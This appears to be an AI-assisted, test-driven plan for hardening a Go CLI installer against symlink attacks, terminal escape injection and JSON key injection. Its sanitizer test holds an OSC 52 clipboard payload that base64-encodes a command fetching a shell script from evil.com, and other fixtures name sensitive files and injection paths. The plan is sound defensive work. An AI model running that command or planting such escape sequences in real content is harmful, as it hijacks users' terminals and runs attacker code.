# Phase 2: Security Hardening Implementation Plan

## Goal

Implement all 12 security hardening items (2.1-2.12) from the security review to protect against symlink attacks, ANSI injection, JSON key injection, and other vulnerabilities when processing content from untrusted sources.

## Architecture

Security fixes are concentrated in three areas:

1. **File operations** (`internal/installer/copy.go`, `internal/installer/jsonmerge.go`) - symlink protection, atomic writes, permissions
2. **TUI rendering** (`internal/tui/detail_render.go`, `internal/tui/filebrowser.go`) - ANSI escape sanitization
3. **JSON/config handling** (`internal/installer/mcp.go`, `internal/installer/hooks.go`, `internal/catalog/scanner.go`) - key path validation, whitelisting

## Tech Stack

- Go 1.25.5
- Standard library: `os`, `syscall`, `filepath`
- Testing: `testing` package with adversarial test fixtures
- Third-party: `tidwall/sjson`, `tidwall/gjson` (with validation)

## Design Document

Based on `/home/hhewett/.local/src/romanesco/docs/reviews/implementation-plan.md` lines 172-251 and `/home/hhewett/.local/src/romanesco/docs/reviews/review-security.md`.

---

## Task 1: Prevent copyFile from following symlinks at destination

**Design items:** 2.1
**Severity:** HIGH
**Files:**
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/installer/copy.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/internal/installer/copy_test.go`

**Depends on:** None

**Success Criteria:**
- [ ] copyFile refuses to write when destination is a symlink
- [ ] Test with symlink at destination verifies copy fails with clear error
- [ ] Existing copy operations still work for normal files

---

### Step 1: Write the failing test

Create test file with symlink attack scenario (note: test uses `package installer` to access unexported functions):

```go
// cli/internal/installer/copy_test.go
package installer

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestCopyFile_RefusesSymlinkDestination(t *testing.T) {
	tmpDir := t.TempDir()

	// Create a source file
	srcFile := filepath.Join(tmpDir, "source.txt")
	if err := os.WriteFile(srcFile, []byte("attack payload"), 0644); err != nil {
		t.Fatal(err)
	}

	// Create a target file that we don't want overwritten
	targetFile := filepath.Join(tmpDir, "important.txt")
	if err := os.WriteFile(targetFile, []byte("important data"), 0644); err != nil {
		t.Fatal(err)
	}

	// Create a symlink at the destination pointing to the important file
	symlinkPath := filepath.Join(tmpDir, "dest.txt")
	if err := os.Symlink(targetFile, symlinkPath); err != nil {
		t.Fatal(err)
	}

	// Attempt to copy - should fail
	err := copyFile(srcFile, symlinkPath)
	if err == nil {
		t.Fatal("copyFile should refuse to follow symlink at destination")
	}

	if !strings.Contains(err.Error(), "symlink") {
		t.Errorf("error should mention symlink, got: %v", err)
	}

	// Verify important file was not overwritten
	data, err := os.ReadFile(targetFile)
	if err != nil {
		t.Fatal(err)
	}
	if string(data) != "important data" {
		t.Errorf("target file was overwritten! got: %s", data)
	}
}

func TestCopyFile_WorksForNormalFiles(t *testing.T) {
	tmpDir := t.TempDir()

	srcFile := filepath.Join(tmpDir, "source.txt")
	if err := os.WriteFile(srcFile, []byte("test content"), 0644); err != nil {
		t.Fatal(err)
	}

	dstFile := filepath.Join(tmpDir, "dest.txt")

	if err := copyFile(srcFile, dstFile); err != nil {
		t.Fatalf("copyFile failed for normal file: %v", err)
	}

	data, err := os.ReadFile(dstFile)
	if err != nil {
		t.Fatal(err)
	}
	if string(data) != "test content" {
		t.Errorf("content mismatch: got %s", data)
	}
}
```

### Step 2: Run test to verify it fails

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/installer/... -run TestCopyFile_RefusesSymlinkDestination -v`

Expected: FAIL - "copyFile should refuse to follow symlink at destination"

### Step 3: Implement the fix

Modify `copyFile` to check for symlinks before writing (note: `fmt` is already imported in copy.go):

```go
// cli/internal/installer/copy.go
func copyFile(src, dst string) error {
	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
		return err
	}

	// Check if destination exists and is a symlink
	if info, err := os.Lstat(dst); err == nil {
		if info.Mode()&os.ModeSymlink != 0 {
			return fmt.Errorf("destination is a symlink: %s (refusing to follow for security)", dst)
		}
	}

	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	// Use O_NOFOLLOW on Unix systems to prevent following symlinks
	// Note: O_NOFOLLOW is not available on Windows, but Lstat check above provides protection
	out, err := os.OpenFile(dst, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer out.Close()

	if _, err = io.Copy(out, in); err != nil {
		return err
	}
	return out.Close()
}
```

### Step 4: Run test to verify it passes

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/installer/... -run TestCopyFile -v`

Expected: PASS (both tests)

### Step 5: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add internal/installer/copy.go internal/installer/copy_test.go
git commit -m "$(cat <<'EOF'
security(installer): prevent copyFile from following symlinks at destination

Addresses SEC-001 (HIGH). Use os.Lstat to detect symlinks at destination
before writing. This prevents an attacker from using a symlink to cause
copyFile to overwrite arbitrary files (e.g., ~/.bashrc, ~/.ssh/authorized_keys).

Attack scenario: malicious content repo contains symlink that gets created
during install, pointing to sensitive file. Without this check, copyFile
would follow the symlink and overwrite the target.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Task 2: Skip symlinks in copyDir source tree

**Design items:** 2.4
**Severity:** MEDIUM
**Files:**
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/installer/copy.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/internal/installer/copy_test.go`

**Depends on:** Task 1

**Success Criteria:**
- [ ] copyDir skips symlinks in source tree instead of following them
- [ ] Test with source symlink to /etc/passwd verifies file is not copied
- [ ] Normal directory copies still work

---

### Step 1: Write the failing test

(Note: test file uses `package installer` to access unexported functions)

```go
// cli/internal/installer/copy_test.go
func TestCopyDir_SkipsSymlinksInSource(t *testing.T) {
	tmpDir := t.TempDir()

	srcDir := filepath.Join(tmpDir, "src")
	if err := os.MkdirAll(srcDir, 0755); err != nil {
		t.Fatal(err)
	}

	// Create a normal file
	normalFile := filepath.Join(srcDir, "normal.txt")
	if err := os.WriteFile(normalFile, []byte("normal content"), 0644); err != nil {
		t.Fatal(err)
	}

	// Create a symlink to a sensitive file (simulated)
	sensitiveFile := filepath.Join(tmpDir, "sensitive.txt")
	if err := os.WriteFile(sensitiveFile, []byte("SECRET DATA"), 0600); err != nil {
		t.Fatal(err)
	}
	symlinkFile := filepath.Join(srcDir, "sneaky.txt")
	if err := os.Symlink(sensitiveFile, symlinkFile); err != nil {
		t.Fatal(err)
	}

	dstDir := filepath.Join(tmpDir, "dst")

	// Copy directory
	if err := copyDir(srcDir, dstDir); err != nil {
		t.Fatalf("copyDir failed: %v", err)
	}

	// Verify normal file was copied
	copiedNormal := filepath.Join(dstDir, "normal.txt")
	if _, err := os.Stat(copiedNormal); err != nil {
		t.Errorf("normal file was not copied: %v", err)
	}

	// Verify symlink was NOT copied (file should not exist)
	copiedSymlink := filepath.Join(dstDir, "sneaky.txt")
	if _, err := os.Stat(copiedSymlink); err == nil {
		t.Error("symlink should not have been copied")
		// Read to see if it contains secret data
		data, _ := os.ReadFile(copiedSymlink)
		t.Errorf("symlink was followed and copied sensitive data: %s", data)
	}
}

func TestCopyDir_NormalDirectories(t *testing.T) {
	tmpDir := t.TempDir()

	srcDir := filepath.Join(tmpDir, "src")
	if err := os.MkdirAll(filepath.Join(srcDir, "subdir"), 0755); err != nil {
		t.Fatal(err)
	}

	if err := os.WriteFile(filepath.Join(srcDir, "file1.txt"), []byte("one"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(srcDir, "subdir", "file2.txt"), []byte("two"), 0644); err != nil {
		t.Fatal(err)
	}

	dstDir := filepath.Join(tmpDir, "dst")

	if err := copyDir(srcDir, dstDir); err != nil {
		t.Fatalf("copyDir failed: %v", err)
	}

	// Verify structure
	if data, err := os.ReadFile(filepath.Join(dstDir, "file1.txt")); err != nil || string(data) != "one" {
		t.Error("file1.txt not copied correctly")
	}
	if data, err := os.ReadFile(filepath.Join(dstDir, "subdir", "file2.txt")); err != nil || string(data) != "two" {
		t.Error("subdir/file2.txt not copied correctly")
	}
}
```

### Step 2: Run test to verify it fails

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/installer/... -run TestCopyDir_SkipsSymlinksInSource -v`

Expected: FAIL - "symlink was followed and copied sensitive data"

### Step 3: Implement the fix

Modify `copyDir` to skip symlinks:

```go
// cli/internal/installer/copy.go
func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Skip symlinks in source tree
		if info.Mode()&os.ModeSymlink != 0 {
			return nil
		}

		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}
		targetPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(targetPath, 0755)
		}
		return copyFile(path, targetPath)
	})
}
```

### Step 4: Run test to verify it passes

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/installer/... -run TestCopyDir -v`

Expected: PASS (both tests)

### Step 5: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add internal/installer/copy.go internal/installer/copy_test.go
git commit -m "$(cat <<'EOF'
security(installer): skip symlinks in copyDir source tree

Addresses SEC-007 (MEDIUM). Skip symlinks during directory traversal to
prevent information disclosure from malicious content repos.

Attack scenario: attacker creates content repo with symlink pointing to
/etc/passwd or ~/.ssh/id_rsa. Without this check, copyDir would follow
the symlink and copy sensitive file contents into my-tools/, which could
then be exfiltrated via promote flow.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Task 3: Strip ANSI escape sequences from TUI-rendered text

**Design items:** 2.2
**Severity:** HIGH
**Files:**
- Create: `/home/hhewett/.local/src/romanesco/cli/internal/tui/sanitize.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/internal/tui/sanitize_test.go`
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/tui/detail_render.go`
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/tui/filebrowser.go`

**Depends on:** None

**Success Criteria:**
- [ ] StripControlChars removes all ANSI escape sequences
- [ ] Test verifies OSC 52 clipboard injection is stripped
- [ ] Test verifies CSI cursor movement is stripped
- [ ] All external text in TUI is sanitized

---

### Step 1: Write the failing test

```go
// cli/internal/tui/sanitize_test.go
package tui

import (
	"testing"
)

func TestStripControlChars(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "OSC 52 clipboard injection",
			input: "normal text\x1b]52;c;Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2gK\x07more text",
			want:  "normal textmore text",
		},
		{
			name:  "CSI cursor movement",
			input: "visible\x1b[Hhidden\x1b[2Jtext",
			want:  "visiblehiddentext",
		},
		{
			name:  "SGR color codes",
			input: "\x1b[31mRED\x1b[0m normal",
			want:  "RED normal",
		},
		{
			name:  "C0 controls except newline and tab",
			input: "text\x00\x01\x02with\nnewline\tand tab",
			want:  "textwith\nnewline\tand tab",
		},
		{
			name:  "DEL character",
			input: "text\x7fmore",
			want:  "textmore",
		},
		{
			name:  "C1 controls",
			input: "text\x80\x9fmore",
			want:  "textmore",
		},
		{
			name:  "normal text unchanged",
			input: "Hello, world! 123",
			want:  "Hello, world! 123",
		},
		{
			name:  "unicode preserved",
			input: "こんにちは 🎉",
			want:  "こんにちは 🎉",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := StripControlChars(tt.input)
			if got != tt.want {
				t.Errorf("StripControlChars() = %q, want %q", got, tt.want)
			}
		})
	}
}
```

### Step 2: Run test to verify it fails

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/tui/... -run TestStripControlChars -v`

Expected: FAIL - "undefined: StripControlChars"

### Step 3: Implement StripControlChars

```go
// cli/internal/tui/sanitize.go
package tui

import (
	"strings"
	"unicode/utf8"
)

// StripControlChars removes ANSI escape sequences and control characters from a string.
// Preserves newlines (\n) and tabs (\t) but strips all other control characters including:
// - ESC (0x1B) and all escape sequences (CSI, OSC, etc.)
// - C0 controls (0x00-0x1F except \n and \t)
// - DEL (0x7F)
// - C1 controls (0x80-0x9F)
//
// This prevents terminal escape injection attacks like clipboard poisoning (OSC 52),
// visual spoofing (cursor movement), and title injection.
func StripControlChars(s string) string {
	var result strings.Builder
	result.Grow(len(s))

	i := 0
	for i < len(s) {
		// Handle multi-byte UTF-8 starting at >= 0x80
		if s[i] >= 0x80 {
			r, size := utf8.DecodeRuneInString(s[i:])

			// Skip C1 controls (0x80-0x9F)
			if r >= 0x80 && r <= 0x9F {
				i += size
				continue
			}

			// Valid UTF-8, include it
			result.WriteString(s[i : i+size])
			i += size
			continue
		}

		// Single-byte ASCII handling
		r := rune(s[i])

		// ESC character - skip entire escape sequence
		if r == 0x1B {
			i++
			i = skipEscapeSequence(s, i)
			continue
		}

		// C0 controls: skip everything except \n (0x0A) and \t (0x09)
		if r < 0x20 {
			if r == '\n' || r == '\t' {
				result.WriteByte(byte(r))
			}
			i++
			continue
		}

		// DEL (0x7F)
		if r == 0x7F {
			i++
			continue
		}

		// Normal printable ASCII
		result.WriteByte(byte(r))
		i++
	}

	return result.String()
}

// skipEscapeSequence advances past an ANSI escape sequence starting after the ESC byte.
func skipEscapeSequence(s string, start int) int {
	if start >= len(s) {
		return start
	}

	// OSC sequences: ESC ] ... ST (ST = ESC \ or BEL 0x07)
	if s[start] == ']' {
		for i := start + 1; i < len(s); i++ {
			if s[i] == 0x07 { // BEL
				return i + 1
			}
			if s[i] == 0x1B && i+1 < len(s) && s[i+1] == '\\' { // ST
				return i + 2
			}
		}
		return len(s)
	}

	// CSI sequences: ESC [ ... (letter or @)
	if s[start] == '[' {
		for i := start + 1; i < len(s); i++ {
			ch := s[i]
			// CSI terminates with a letter (A-Z, a-z) or @
			if (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z') || ch == '@' {
				return i + 1
			}
		}
		return len(s)
	}

	// Other escape sequences (single character)
	return start + 1
}
```

### Step 4: Apply sanitization to TUI rendering

Modify detail_render.go to sanitize external text (note: `fmt` is already imported at line 4):

```go
// cli/internal/tui/detail_render.go
// At the top of renderContent(), sanitize item name and description:
func (m detailModel) renderContent() string {
	name := StripControlChars(displayName(m.item))
	s := helpStyle.Render("nesco > "+m.item.Type.Label()+" >") + " " + titleStyle.Render(name)
	if m.item.Local {
		s += " " + warningStyle.Render("LOCAL")
	}
	s += "\n"

	// Description (always shown above tabs)
	if m.item.Description != "" {
		desc := StripControlChars(m.item.Description)
		if len(desc) > 200 {
			desc = desc[:197] + "..."
		}
		s += valueStyle.Render(desc) + "\n"
	}
	// ... rest unchanged
}

// In renderOverviewTab(), sanitize item.Body:
func (m detailModel) renderOverviewTab() string {
	var s string

	// Prompt body (for prompts type)
	if m.item.Type == catalog.Prompts && m.item.Body != "" {
		s += labelStyle.Render("Prompt:") + "\n"
		s += valueStyle.Render(StripControlChars(m.item.Body)) + "\n\n"
	}
	// ... continue for other body fields
}

// In renderFileContent(), wrap line content with StripControlChars.
// Change line 193-194 from:
//   s += lineNum + valueStyle.Render(lines[i]) + "\n"
// To:
func (m detailModel) renderFileContent() string {
	// ... existing code until the line rendering loop (around line 193) ...
	for i := offset; i < end; i++ {
		lineNum := helpStyle.Render(fmt.Sprintf("%4d ", i+1))
		s += lineNum + valueStyle.Render(StripControlChars(lines[i])) + "\n"
	}
	// ... rest unchanged
}

// In renderFileList(), sanitize filenames:
func (m detailModel) renderFileList() string {
	if len(m.item.Files) == 0 {
		return helpStyle.Render("No files in this item.") + "\n"
	}

	var s string
	for i, f := range m.item.Files {
		prefix := "  "
		style := itemStyle
		if i == m.fileCursor {
			prefix = "▸ "
			style = selectedItemStyle
		}
		s += fmt.Sprintf("  %s%s\n", prefix, style.Render(StripControlChars(f)))
	}
	return s
}
```

Modify filebrowser.go to sanitize filenames:

```go
// cli/internal/tui/filebrowser.go
// In the View() method around line 274, sanitize entry.name:
for i, entry := range visible {
	// ... existing cursor/selection logic ...
	line := prefix + sel + " " + icon + " " + style.Render(StripControlChars(entry.name))
	// ... rest of rendering
}
```

### Step 5: Run tests to verify they pass

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/tui/... -run TestStripControlChars -v`

Expected: PASS

### Step 6: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add internal/tui/sanitize.go internal/tui/sanitize_test.go internal/tui/detail_render.go internal/tui/filebrowser.go
git commit -m "$(cat <<'EOF'
security(tui): strip ANSI escape sequences from all external text

Addresses SEC-002 (HIGH). Prevent terminal escape injection attacks including
clipboard poisoning (OSC 52), visual spoofing (cursor movement), and title
injection.

All text from external sources (filenames, metadata, file content, git output)
is now sanitized via StripControlChars() before TUI rendering. This removes:
- ESC sequences (CSI, OSC, etc.)
- C0 controls (except \n, \t)
- DEL (0x7F)
- C1 controls (0x80-0x9F)

Attack scenario: malicious README.md contains `\x1b]52;c;<base64>\x07` which
writes to clipboard when rendered. User pastes in terminal, executing attacker's
command. This fix strips the escape sequence, rendering it as literal text.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Task 4: Validate item.Name against sjson special characters

**Design items:** 2.3
**Severity:** HIGH
**Files:**
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/catalog/scanner.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/internal/catalog/scanner_test.go`

**Depends on:** None

**Success Criteria:**
- [ ] Item names with `.`, `*`, `#`, `|` are rejected during scanning
- [ ] Test verifies directory named "foo.bar" is skipped with warning
- [ ] Valid names with alphanumeric, dash, underscore work

---

### Step 1: Write the failing test

```go
// cli/internal/catalog/scanner_test.go (create if doesn't exist, or add to existing)
package catalog

import (
	"os"
	"path/filepath"
	"testing"
)

func TestScan_RejectsInvalidItemNames(t *testing.T) {
	tmpDir := t.TempDir()

	// Create skills directory
	skillsDir := filepath.Join(tmpDir, "skills")
	if err := os.MkdirAll(skillsDir, 0755); err != nil {
		t.Fatal(err)
	}

	invalidNames := []string{
		"foo.bar",     // dot (sjson path separator)
		"skill*",      // asterisk (sjson wildcard)
		"skill#hash",  // hash (sjson modifier)
		"skill|pipe",  // pipe (sjson alternative)
		"mcpServers.evil", // path injection attempt
	}

	for _, name := range invalidNames {
		dir := filepath.Join(skillsDir, name)
		if err := os.MkdirAll(dir, 0755); err != nil {
			t.Fatal(err)
		}
		// Create a SKILL.md so it looks like valid content
		if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("# Test"), 0644); err != nil {
			t.Fatal(err)
		}
	}

	// Create a valid skill
	validDir := filepath.Join(skillsDir, "valid-skill_123")
	if err := os.MkdirAll(validDir, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(validDir, "SKILL.md"), []byte("# Valid"), 0644); err != nil {
		t.Fatal(err)
	}

	cat, err := Scan(tmpDir)
	if err != nil {
		t.Fatalf("Scan failed: %v", err)
	}

	// Should only find the valid skill
	if len(cat.Items) != 1 {
		t.Errorf("expected 1 item, got %d", len(cat.Items))
		for _, item := range cat.Items {
			t.Logf("  found: %s", item.Name)
		}
	}

	if len(cat.Items) > 0 && cat.Items[0].Name != "valid-skill_123" {
		t.Errorf("expected valid-skill_123, got %s", cat.Items[0].Name)
	}
}

func TestScan_AcceptsValidItemNames(t *testing.T) {
	tmpDir := t.TempDir()

	skillsDir := filepath.Join(tmpDir, "skills")
	if err := os.MkdirAll(skillsDir, 0755); err != nil {
		t.Fatal(err)
	}

	validNames := []string{
		"simple",
		"with-dash",
		"with_underscore",
		"alphaNum123",
		"ALL-CAPS_test",
	}

	for _, name := range validNames {
		dir := filepath.Join(skillsDir, name)
		if err := os.MkdirAll(dir, 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("# "+name), 0644); err != nil {
			t.Fatal(err)
		}
	}

	cat, err := Scan(tmpDir)
	if err != nil {
		t.Fatalf("Scan failed: %v", err)
	}

	if len(cat.Items) != len(validNames) {
		t.Errorf("expected %d items, got %d", len(validNames), len(cat.Items))
	}
}
```

### Step 2: Run test to verify it fails

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/catalog/... -run TestScan_RejectsInvalidItemNames -v`

Expected: FAIL - "expected 1 item, got 6" (all invalid names were scanned)

### Step 3: Implement validation in scanner

```go
// cli/internal/catalog/scanner.go
// Add at top of file:
import (
	"regexp"
	// ... existing imports
)

var validItemNameRegex = regexp.MustCompile(`^[a-zA-Z0-9_-]+$`)

// Add validation function:
func isValidItemName(name string) bool {
	return validItemNameRegex.MatchString(name)
}

// Modify scanUniversal to validate names (around line 66):
func scanUniversal(cat *Catalog, typeDir string, ct ContentType, entries []os.DirEntry, local bool) error {
	for _, entry := range entries {
		if !entry.IsDir() || shouldSkip(entry.Name()) {
			continue
		}

		// Validate item name for sjson/gjson safety
		if !isValidItemName(entry.Name()) {
			// Skip items with special characters that could enable JSON key injection
			// Silently skip to avoid breaking existing workflows, but could log if needed
			continue
		}

		itemDir := filepath.Join(typeDir, entry.Name())
		// ... rest of function unchanged
```

Also modify `scanProviderSpecific` similarly (around line 150):

```go
func scanProviderSpecific(cat *Catalog, typeDir string, ct ContentType, entries []os.DirEntry, local bool) error {
	for _, entry := range entries {
		if entry.IsDir() || shouldSkip(entry.Name()) {
			continue
		}

		// Extract item name from filename (without extension)
		name := strings.TrimSuffix(entry.Name(), filepath.Ext(entry.Name()))

		// Validate item name
		if !isValidItemName(name) {
			continue
		}

		// ... rest of function unchanged
```

### Step 4: Run tests to verify they pass

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/catalog/... -run TestScan_.*ItemNames -v`

Expected: PASS (both tests)

### Step 5: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add internal/catalog/scanner.go internal/catalog/scanner_test.go
git commit -m "$(cat <<'EOF'
security(catalog): validate item names against sjson special characters

Addresses SEC-003 (HIGH). Reject item names containing `.`, `*`, `#`, `|`
during scanning to prevent JSON key path injection.

sjson/gjson use `.` as path separator and interpret `*`, `#`, `|` as operators.
A malicious directory name like "foo.bar" would cause MCP install to write to
nested path mcpServers.foo.bar instead of mcpServers."foo.bar".

Only allow alphanumeric, dash, and underscore in item names. Invalid names
are silently skipped during scan.

Attack scenario: attacker creates skill named "mcpServers.evil" which causes
installer to write config to wrong location, potentially overwriting existing
MCP servers.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Task 5: Make config file writes atomic (temp + rename)

**Design items:** 2.5
**Severity:** MEDIUM
**Files:**
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/installer/jsonmerge.go`
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/config/config.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/internal/installer/jsonmerge_test.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/internal/config/config_test.go`

**Depends on:** None

**Success Criteria:**
- [ ] Config writes use temp-then-rename pattern
- [ ] Test verifies target file is never partially written
- [ ] Existing config operations still work

---

### Step 1: Write the failing test

```go
// cli/internal/installer/jsonmerge_test.go
package installer

import (
	"os"
	"path/filepath"
	"sync/atomic"
	"testing"
	"time"
)

func TestWriteJSONFile_Atomic(t *testing.T) {
	tmpDir := t.TempDir()
	targetFile := filepath.Join(tmpDir, "config.json")

	// Write initial content
	initialData := []byte(`{"version": 1}`)
	if err := writeJSONFile(targetFile, initialData); err != nil {
		t.Fatal(err)
	}

	// Verify file exists
	if _, err := os.Stat(targetFile); err != nil {
		t.Fatal("file was not created")
	}

	// Read back
	data, err := os.ReadFile(targetFile)
	if err != nil {
		t.Fatal(err)
	}
	if string(data) != string(initialData) {
		t.Errorf("content mismatch: got %s", data)
	}
}

func TestWriteJSONFile_NoPartialWrites(t *testing.T) {
	tmpDir := t.TempDir()
	targetFile := filepath.Join(tmpDir, "config.json")

	// Write initial content
	initialData := []byte(`{"original": "data"}`)
	if err := os.WriteFile(targetFile, initialData, 0644); err != nil {
		t.Fatal(err)
	}

	// Simulate a monitoring goroutine that reads the file repeatedly
	// The file should NEVER be empty or partially written
	done := make(chan bool)
	foundPartial := atomic.Bool{}

	go func() {
		for {
			select {
			case <-done:
				return
			default:
				if data, err := os.ReadFile(targetFile); err == nil {
					// File should always contain valid JSON (either old or new)
					if len(data) == 0 {
						foundPartial.Store(true)
					}
					// Quick check: should start with `{`
					if len(data) > 0 && data[0] != '{' {
						foundPartial.Store(true)
					}
				}
				time.Sleep(1 * time.Millisecond)
			}
		}
	}()

	// Perform write
	newData := []byte(`{"updated": "content", "with": "more", "fields": "here"}`)
	if err := writeJSONFile(targetFile, newData); err != nil {
		t.Fatal(err)
	}

	close(done)
	time.Sleep(10 * time.Millisecond) // Let monitor finish

	if foundPartial.Load() {
		t.Fatal("file was in partial state during write (not atomic)")
	}

	// Verify final content
	finalData, err := os.ReadFile(targetFile)
	if err != nil {
		t.Fatal(err)
	}
	if string(finalData) != string(newData) {
		t.Errorf("final content mismatch: got %s", finalData)
	}
}
```

### Step 2: Run test to verify it fails

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/installer/... -run TestWriteJSONFile_NoPartialWrites -v`

Expected: Might PASS or FAIL depending on timing, but the current implementation is not atomic (uses os.WriteFile directly which truncates before writing)

### Step 3: Implement atomic write

```go
// cli/internal/installer/jsonmerge.go
import (
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"

	"github.com/tidwall/gjson"
	"github.com/tidwall/sjson"
)

// writeJSONFile writes data to a JSON file atomically using temp-then-rename.
// The target file is never left in a partially-written state.
func writeJSONFile(path string, data []byte) error {
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("creating directory: %w", err)
	}

	// Generate random suffix for temp file
	suffix := make([]byte, 8)
	if _, err := rand.Read(suffix); err != nil {
		return fmt.Errorf("generating temp file suffix: %w", err)
	}
	tempPath := path + ".tmp." + hex.EncodeToString(suffix)

	// Write to temp file
	if err := os.WriteFile(tempPath, data, 0644); err != nil {
		return fmt.Errorf("writing temp file: %w", err)
	}

	// Atomic rename (on POSIX systems, this is atomic within same filesystem)
	if err := os.Rename(tempPath, path); err != nil {
		os.Remove(tempPath) // Clean up temp file on failure
		return fmt.Errorf("renaming temp file: %w", err)
	}

	return nil
}
```

Also update config.Save:

```go
// cli/internal/config/config.go
import (
	"crypto/rand"
	"encoding/hex"
	// ... existing imports
)

func Save(projectRoot string, cfg *Config) error {
	dir := DirPath(projectRoot)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}
	data, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return err
	}

	// Atomic write with temp-then-rename
	targetPath := FilePath(projectRoot)
	suffix := make([]byte, 8)
	if _, err := rand.Read(suffix); err != nil {
		return err
	}
	tempPath := targetPath + ".tmp." + hex.EncodeToString(suffix)

	if err := os.WriteFile(tempPath, data, 0644); err != nil {
		return err
	}

	if err := os.Rename(tempPath, targetPath); err != nil {
		os.Remove(tempPath)
		return err
	}

	return nil
}
```

### Step 4: Run tests to verify they pass

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/installer/... -run TestWriteJSONFile -v`

Expected: PASS

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/config/... -v`

Expected: PASS (existing tests should still work)

### Step 5: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add internal/installer/jsonmerge.go internal/installer/jsonmerge_test.go internal/config/config.go
git commit -m "$(cat <<'EOF'
security(installer,config): make config file writes atomic

Addresses SEC-006 (MEDIUM). Use temp-then-rename pattern to prevent config
file corruption if process is interrupted during write.

Previous implementation used os.WriteFile which truncates the file before
writing. If interrupted (crash, SIGKILL, power loss), config files like
~/.claude.json would be left empty or partially written.

New implementation writes to temp file then atomically renames. On POSIX
systems, rename is atomic within the same filesystem, guaranteeing the
target file always contains either old or new content, never partial.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Task 6: Use 0600 permissions for home-directory config files

**Design items:** 2.6
**Severity:** MEDIUM
**Files:**
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/installer/jsonmerge.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/internal/installer/jsonmerge_test.go`

**Depends on:** Task 5

**Success Criteria:**
- [ ] Files in $HOME use 0600 permissions
- [ ] Project-level files still use 0644
- [ ] Test verifies permissions are set correctly

---

### Step 1: Write the failing test

```go
// cli/internal/installer/jsonmerge_test.go
func TestWriteJSONFile_Permissions(t *testing.T) {
	tmpDir := t.TempDir()

	// Simulate home directory file
	homeFile := filepath.Join(tmpDir, ".claude.json")
	data := []byte(`{"test": true}`)

	if err := writeJSONFileWithPerm(homeFile, data, 0600); err != nil {
		t.Fatal(err)
	}

	info, err := os.Stat(homeFile)
	if err != nil {
		t.Fatal(err)
	}

	mode := info.Mode().Perm()
	if mode != 0600 {
		t.Errorf("home file should have 0600 permissions, got %o", mode)
	}
}

func TestWriteJSONFile_ProjectPermissions(t *testing.T) {
	tmpDir := t.TempDir()

	// Simulate project-level file
	projectFile := filepath.Join(tmpDir, ".nesco", "config.json")
	data := []byte(`{"test": true}`)

	if err := writeJSONFileWithPerm(projectFile, data, 0644); err != nil {
		t.Fatal(err)
	}

	info, err := os.Stat(projectFile)
	if err != nil {
		t.Fatal(err)
	}

	mode := info.Mode().Perm()
	if mode != 0644 {
		t.Errorf("project file should have 0644 permissions, got %o", mode)
	}
}
```

### Step 2: Run test to verify it fails

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/installer/... -run TestWriteJSONFile_.*Permissions -v`

Expected: FAIL - "undefined: writeJSONFileWithPerm"
